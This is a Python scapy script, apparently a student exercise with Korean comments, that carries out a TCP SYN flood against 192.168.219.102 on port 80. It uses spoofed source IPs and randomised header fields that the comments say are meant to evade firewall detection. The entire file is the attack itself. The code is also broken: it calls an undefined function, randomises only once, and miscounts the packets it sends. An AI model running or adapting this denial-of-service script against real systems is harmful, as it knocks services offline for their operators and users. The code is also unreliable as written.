#------------------------------------------------------------------------------------------------------------------

#                                           2020.12.18


#                                        이 태 서 학 생 TCP_SYN_flooding 작성


from scapy.all import *
import random


def randomIP(): # 임의의 출발지 IP 생성 함수
    ip = ".".join(map(str, (random.randint(0,255) for a in range(4))))
    return ip

def randInt(): # 방화벽 탐지 설정 교란을 위한 무작위 숫자 추출 함수
    Firewall_disturb = random.randint(1000, 9000)
    return Firewall_disturb


if __name__ == '__main__':
    dstIP = "192.168.219.102"
    dstPort = 80
    counter = 10000

    total = 0
    print("Packets are sending..")

    s_port = randInt()  # 포트 번호 무작위 설정
    s_eq = randInt()  # 일련 번호 무작위설정
    w_indow = randInt()  # 윈도우 크기 무작위 설정
    i = IP(src=_randomIP(), dst=dstIP)
    t = TCP(sport=s_port, dport=dstPort, flags="S", seq=s_eq, window=w_indow)

    for Firewall_disturb in range(0, counter):
      send(i/t, verbose=0)
    total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


#---------------------------------------------------------------------------------------------------------------------